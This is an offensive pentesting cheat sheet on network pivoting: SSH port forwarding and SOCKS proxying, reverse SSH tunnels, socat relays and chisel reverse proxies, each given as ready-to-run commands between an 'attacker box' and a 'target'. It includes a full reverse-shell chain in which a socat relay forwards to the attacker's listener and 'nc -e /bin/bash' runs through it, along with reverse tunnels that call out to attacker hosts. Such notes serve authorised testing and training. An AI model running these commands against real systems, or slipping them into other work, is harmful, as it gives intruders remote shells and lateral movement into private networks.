# SSH port forwarding
```bash
ssh -L (localport):(target):(targetport) user@(pivotip) -fN
# exemple:
# ssh access to 10.0.0.1
# found web server on 10.0.0.3 and want to access it from attacker
ssh -L 8000:10.0.0.3:80 root@10.0.0.1 -fN
# found a webserver listening on 127.0.0.1 on 10.0.0.1
ssh -L 8000:127.0.0.1:80 user@10.0.0.1 -fN
# can now access both website from http://localhost:8000
```

# SSH proxying
```bash
ssh -D (proxyport) user@(pivotip) -fN
# exemple:
# ssh access to 10.0.0.1
# create socks proxy on port 1337
ssh -D 1337 root@10.0.0.1 -fN
```

# reverse SSH connection
```bash
# target opens ssh connection to attacker
# risky
# create ssh keypair
$ ssh-keygen
# add this line to authorized_keys
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa AAA............
# copy private key on target
ssh -R 8000:(targetip):(targetport) user@(attackerip) -i id_rsa -fN
ssh -R 2222:10.0.0.3:22 root@10.0.0.1 -i id_rsa
```

# socat reverse shell relay
```bash
# start listener on attacker box
nc -lnvp 443
# start the relay on the target server
socat tcp-l:8000 tcp:(attackerip):443 &
# open reverse shell
nc 127.0.0.1 8000 -e /bin/bash
```

# socat port forwarding
```bash
# easy way
socat tcp-l:(listeningport),fork,reuseaddr tcp:(targetip):(targetport)
# pro way (quiet)
## on attacker box
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
## on target relay server (does not open port on target relay)
socat tcp(attackerip):8001 tcp:(targetip):(targetport)
```

# chisel reverse socks proxy
```bash
# open listener on attacker box
./chisel server -l (listenport) --reverse &
# open reverse proxy from target server
./chisel client (attackerip):(listenport) R:socks &
```

# chisel forward proxy
```bash
# open listener on target server
./chisel server -p (listenport) --socks5
# connect from attacker box
./chisel client (targetip):(listenport) (proxyport):socks
```

# chisel remote port forward
```bash
# attacker
./chisel server -l (listenport) --reverse &
# target
./chisel client (attackerip):listenport R:(localport):(targetip):(targetport) &
```

# chisel local port forward
```bash
# attacker
./chisel server -l (listenport)
# target
./chisel client (relayip):(listenport) (localport):(targetip):(targetport) &
```